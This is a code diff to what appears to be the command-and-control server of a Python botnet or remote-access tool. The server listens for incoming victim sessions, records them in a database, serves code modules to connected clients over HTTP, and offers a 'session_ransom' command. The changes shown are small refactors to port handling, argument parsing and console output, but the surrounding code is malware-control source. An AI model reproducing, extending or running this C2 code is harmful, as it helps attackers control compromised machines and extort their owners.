@@ -89,9 +89,15 @@ def main():
         default='database.db',
         help='SQLite database')
 
-    options = parser.parse_args()
     modules = os.path.abspath('modules')
-    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages'][0]
+    packages = [os.path.abspath(_) for _ in sys.path if os.path.isdir(_) if os.path.basename(_) == 'site-packages']
+    
+    if len(packages):
+        packages = packages[0]
+        options = parser.parse_args()
+    else:
+        util.__logger__.debug("unable to locate 'site-packages' in sys.path (directory containing user-installed packages/modules)")
+        sys.exit(0)
 
     globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=packages, shell=True)
     globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
@@ -134,7 +140,7 @@ class C2():
         self._database = db
         self.current_session = None
         self.sessions = {}
-        self.socket = self._socket()
+        self.socket = self._socket(port)
         self.banner = self._banner()
         self.commands = {
             'set' : {
@@ -226,7 +232,7 @@ class C2():
                 util.display('\x20' * 4, end=',')
                 util.display(str(info), color=self._text_color, style=self._text_style)
 
-    def _socket(self, port=1337):
+    def _socket(self, port):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', port))
@@ -588,8 +594,10 @@ class C2():
         """
         lock = self.current_session._lock if self.current_session else self._lock
         with lock:
+            print
             sessions = self.database.get_sessions(verbose=verbose)
             self.database._display(sessions)
+            print
 
     def session_ransom(self, args=None):
         """ 
@@ -650,16 +658,14 @@ class C2():
         while True:
             connection, address = self.socket.accept()
             session = Session(connection=connection, id=self._count)
-            util.display("\n\n\t[+]", color='green', style='bright', end=',')
+            util.display("\n\n[+]", color='green', style='bright', end=',')
             util.display("New Connection:", color='white', style='bright', end=',')
             util.display(address[0], color='white', style='normal')
-            util.display("\t    Session:", color='white', style='bright', end=',')
+            util.display("    Session:", color='white', style='bright', end=',')
             util.display(str(self._count), color='white', style='normal')
-            util.display("\t    Started:", color='white', style='bright', end=',')
+            util.display("    Started:", color='white', style='bright', end=',')
             util.display(time.ctime(session._created) + "\n", color='white', style='normal')
-            self.database._display(session.info)
             info = self.database.handle_session(session.info)
-            self.database._display(session.info)
             if isinstance(info, dict):
                 session.info = info
             self.sessions[self._count] = session
